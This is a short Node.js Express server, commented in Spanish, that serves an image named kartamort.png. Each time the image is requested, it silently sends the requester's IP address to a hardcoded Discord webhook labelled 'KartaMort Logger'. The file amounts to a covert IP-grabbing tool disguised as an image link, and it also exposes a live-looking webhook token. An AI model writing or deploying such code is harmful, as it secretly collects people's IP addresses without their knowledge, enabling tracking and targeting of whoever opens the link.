const express = require('express');
const path = require('path');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args)); // Importar 'node-fetch'
const app = express();

// Configuramos Express para servir archivos estáticos desde la carpeta 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Ruta para servir la imagen (esto debería funcionar ahora)
app.get('/img/kartamort.png', (req, res) => {
  // Puedes usar directamente la ruta del archivo si está en la carpeta 'public'
  const imagePath = path.join(__dirname, 'public', 'kartamort.png');

  // Si la imagen no existe, mostramos un error
  res.sendFile(imagePath, (err) => {
    if (err) {
      console.error('Error al servir la imagen:', err);
      return res.status(500).send('Error al servir la imagen');
    }

    // Enviar la IP al webhook de Discord
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const payload = {
      username: "KartaMort Logger",
      content: `IP: ${ip}`
    };

    fetch("https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI", {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(err => console.error("Error en el webhook:", err));
  });
});

// Configuramos el puerto
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Servidor corriendo en el puerto ${port}`);
});